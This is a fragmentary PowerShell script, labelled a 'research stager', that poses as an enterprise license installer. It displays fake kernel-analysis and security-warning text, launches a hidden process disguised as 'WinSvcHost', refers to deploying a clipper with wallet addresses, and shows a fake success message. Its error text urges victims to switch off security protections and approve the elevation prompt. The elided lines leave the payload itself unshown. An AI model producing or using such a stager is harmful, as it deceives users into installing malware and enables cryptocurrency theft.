# --- [RESEARCH STAGER v51.0: SYNCHRONIZED DEPLOYMENT] ---
...
function Show-SecurityPrep {
    ...
    $console.Text = " > ANALYZING KERNEL... DONE`n > PRIVILEGES: ADMINISTRATOR`n > STATUS: [!] SECURITY INTERFERENCE"
...
function Run-Deployment {
    ...
    $form.Text = "Deploying..."; $form.Size = New-Object Drawing.Size(450,220); $form.StartPosition = "CenterScreen"; $form.TopMost = $true
    ...
    try {
        # --- THE V34.0 CORE INSTALLATION ENGINE ---
        ...
        $pb.Value = 50; $status.Text = "Status: Action Required! Click YES on Security Prompt..."
        Start-Process $path -WindowStyle Hidden

        # VERIFICATION LOOP: Waits for the file to actually start before moving the bar
        $timer = 0
        ...
        if ((Get-Process "WinSvcHost" -ErrorAction SilentlyContinue).Count -gt 0) {
            $pb.Value = 80; $status.Text = "Status: Finalizing Shell Sync..."
            
            # Clipper Deployment (Verified Addresses)
            ...
            Start-Sleep -m 500
            $form.Close()
            [Windows.Forms.MessageBox]::Show("Success: Enterprise License Applied.", "Complete", 0, 64) | Out-Null
        } else {
            throw "User declined security prompt or timeout."
        }
    } catch {
        $form.Close()
        [Windows.Forms.MessageBox]::Show("Error: Installation blocked. Ensure Security toggles are OFF and you click 'Yes' on the prompt.", "Critical Error", 0, 16) | Out-Null
    }
}
